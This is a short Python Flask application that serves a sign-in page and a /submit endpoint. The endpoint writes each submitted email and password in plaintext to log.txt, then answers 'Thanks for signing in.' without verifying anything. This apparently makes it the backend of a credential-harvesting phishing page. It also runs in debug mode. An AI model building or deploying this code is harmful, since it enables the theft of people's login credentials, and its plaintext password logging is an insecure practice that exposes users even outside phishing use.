from flask import Flask, request, jsonify, render_template
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/password')
def password():
    return render_template('password.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')

    with open("log.txt", "a") as f:
        f.write(f"{datetime.now()} - Email: {email} | Password: {password}\n")

    return jsonify({"message": "Thanks for signing in."})

if __name__ == '__main__':
    app.run(debug=True)
